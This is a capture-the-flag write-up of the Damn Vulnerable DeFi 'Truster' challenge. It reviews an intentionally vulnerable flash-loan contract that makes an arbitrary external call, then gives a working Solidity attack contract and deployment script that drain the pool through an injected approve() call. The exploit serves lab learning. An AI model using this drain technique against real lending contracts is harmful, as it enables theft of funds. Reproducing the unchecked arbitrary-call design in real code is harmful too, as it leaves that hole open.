<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/3.png">

# Target Contract Review

Given contract.

**TrusterLenderPool.sol**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
}
```

`TrusterLenderPool` is a contract that **allows users to borrow tokens from the pool and execute arbitrary code in a flash loan**.

The constructor function takes an instance of the `DamnValuableToken` contract and assigns it to the token variable.

`flashLoan()` : It allows a borrower to borrow a specified amount of tokens from the pool and execute a target function with provided data. The borrower must provide the amount to borrow, their address, the target contract address, and the data to be executed.

Inside the function, the current balance of the token contract is stored in the `balanceBefore` variable. Then, the specified amount of tokens is transferred from the pool to the borrower's address using the transfer function of the token contract. After that, the target function specified by the borrower is executed using the `functionCall()` function.







Challenge's message:

> More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
The pool holds 1 million DVT tokens. You have nothing.
To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

# Subverting

The `flashLoan()` function allows one to take a flash loan and then ensures that the loan has been paid back. This function execute `target.functionCall(data)` command which gives us ability of calling a low-level function. In other words, we can call ERC20 standart token's functions. Like `approve()`...

In this case, we can call `approve()` function to approve all balance. After then, we clearly call flashLoan function to transfer all token from the pool contract with passing first paramater as 0. Here is our attack contract looks like:


```solidity
pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackTruster {

    TrusterLenderPool pool;
    constructor(address payable _pool){
        pool = TrusterLenderPool(_pool);
    }

    function attack(IERC20 token)external{
        uint balance = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), balance);
        pool.flashLoan(0, msg.sender, address(token), data);
        token.transferFrom(address(pool), msg.sender, balance);
    }
}
```

Basically, it gets the address of the `TrusterLenderPool` contract in the constructor. Later, it gets the pool contract's balance. Next, it encodes the data variable with the abi signature parameter as the approve function and its parameters we will have sent when the functionCall() is executed.

In the final step, first we call the flashLoan function to execute data. Lastly, we transfer all tokens to our balance. Here is attacker commands:

```js
const AttackFactory = await ethers.getContractFactory('AttackTruster', deployer);
attack = await AttackFactory.deploy(pool.address);
await attack.connect(player).attack(token.address);
```

Solve the challenge.

```powershell
  [Challenge] Truster
    ✔ Execution (73ms)


  1 passing (2s)

Done in 2.75s.
```

**_by wasny0ps_**
